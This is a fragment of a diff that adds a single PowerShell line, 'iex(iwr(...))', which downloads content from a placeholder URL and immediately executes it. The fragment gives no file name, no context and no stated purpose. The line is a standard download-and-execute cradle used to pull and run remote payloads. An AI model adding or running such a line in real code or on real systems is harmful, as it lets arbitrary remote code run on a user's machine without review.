@@ -1,0 +1,1 @@
+iex(iwr("https://URL"))
